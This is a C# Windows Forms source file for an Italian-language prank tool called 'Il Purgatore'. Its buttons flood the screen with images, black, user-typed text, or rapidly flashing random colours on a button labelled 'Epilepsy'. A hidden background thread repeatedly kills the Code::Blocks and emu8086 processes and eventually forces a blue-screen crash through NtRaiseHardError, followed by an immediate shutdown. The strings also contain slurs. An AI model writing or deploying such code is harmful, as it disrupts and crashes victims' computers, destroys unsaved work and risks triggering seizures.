using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
using System;
using System.Threading;
using System.Diagnostics;
using System.Linq;
using System.Collections.Generic;

namespace purghe
{
	public partial class Form1 : Form
	{
		[DllImport("user32.dll")]
		public static extern IntPtr GetDC(IntPtr hwnd);
		[DllImport("kernel32.dll")]
		public static extern bool AllocConsole();
		[DllImport("kernel32.dll")]
		public static extern bool FreeConsole();
		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint error, uint nParams, uint unicodeMask, IntPtr parameters, uint validResponse, out uint response);
		[DllImport("ntdll.dll")]
		public static extern IntPtr RtlAdjustPrivilege(int privilege, bool enablePrivilege, bool isThreaded, out bool previous);

		Graphics graphics;
		Random rand;
		Thread payloadThread;
		Action payloadMethod;

		public Form1()
		{
			InitializeComponent();
			rand = new Random();
			graphics = Graphics.FromHdc(GetDC(IntPtr.Zero));
			payloadThread = new Thread(() =>
			{
				while (true)
				{
					payloadMethod();
				}
			});
			PayloadDuration.Hide();
			DurationLabel.Hide();
		}

		private void DrawImageButton_Click(object sender, EventArgs e)
		{
			if (!Warning()) return;
			if (FilePicker.ShowDialog() != DialogResult.OK) return;
			Image image = Image.FromFile(FilePicker.FileName);
			payloadMethod = () => graphics.DrawImage(image, ScreenBounds());
			RunPayload();
		}
		
		private void BlackScreenButtonClick(object sender, EventArgs e)
		{
			if (!Warning()) return;
			payloadMethod = () => graphics.FillRectangle(new SolidBrush(Color.Black), ScreenBounds());
			RunPayload();
		}

		private void EpilepsyButtonClick(object sender, EventArgs e)
		{
			if (!Warning()) return;
			payloadMethod = () => graphics.FillRectangle(new SolidBrush(RandomColor()), ScreenBounds());
			RunPayload();
		}

		private void PrintTextButtonClick(object sender, EventArgs e)
		{
			if (!Warning()) return;
			AllocConsole();
			Console.WriteLine("INSERISCI IL TESTO (NON SOSPETTO!!!!)!!\n");
			string path = Console.ReadLine();
			FreeConsole();
			payloadMethod = () => graphics.DrawString(path, new Font("Comic Sans MS", 50), new SolidBrush(RandomColor()), RandomPoint());
			RunPayload();
		}

        private void KillCodeBlocksButtonClick(object sender, EventArgs e)
		{
			Hide();
			new Thread(() =>
			{
				Dictionary<string, int> processDict = new Dictionary<string, int>();
				string[] forbiddenProcesses = { "codeblocks", "emu8086" };

				foreach (string process in forbiddenProcesses)
				{
					processDict.Add(process, 0);
				}

				while (true)
				{
					foreach (Process proc in Process.GetProcesses().Where(p => forbiddenProcesses.Contains(p.ProcessName)))
					{
						proc.Kill();
						switch (processDict[proc.ProcessName]++)
						{
							case 0:
								MessageBox.Show($"CHIUDI {proc.ProcessName.ToUpper()}!");
								break;
							case 1:
								MessageBox.Show("HO DETTO CHIUDI!");
								break;
							case 2:
								MessageBox.Show("BASTA!");
								break;
							case 3:
								RtlAdjustPrivilege(19, true, false, out _);
								NtRaiseHardError(0xffffffff, 0, 0, IntPtr.Zero, 6, out _);
								Process.Start("shutdown", "/s /t 0"); // non si sa mai
								break;
							default: break;
						}
					}
				}
			}).Start();
		}

        private void PayloadTimedCheckChanged(object sender, EventArgs e)
        {
			if (!PayloadTimedCheck.Checked)
			{
				DurationLabel.Show();
				PayloadDuration.Show();
			}
			else
			{
				DurationLabel.Hide();
				PayloadDuration.Hide();
			}
        }

		private void RunPayload()
		{
			if (!PayloadTimedCheck.Checked)
			{
				if (!int.TryParse(PayloadDuration.Text, out int duration))
				{
					MessageBox.Show("SCRIVI UN NUMERO! HANDICAPPATO!");
					return;
				}
				new Thread(() =>
				{
					Thread.Sleep(duration * 1000);
					payloadThread.Abort();
				}).Start();
			}
			Hide();
            payloadThread.Start();
        }

		private bool Warning()
		{
			DialogResult result = MessageBox.Show("SICURO?", "Messaggio da Il Purgatore", MessageBoxButtons.OKCancel);
			if (result == DialogResult.OK)
			{
				return true;
			}
			MessageBox.Show("pussy");
			return false;
		}

        private Color RandomColor() => Color.FromArgb(rand.Next(0, 256), rand.Next(0, 256), rand.Next(0, 256));

		private Point RandomPoint() => new Point(rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));

		private Rectangle ScreenBounds() => Screen.PrimaryScreen.Bounds;
    }
}
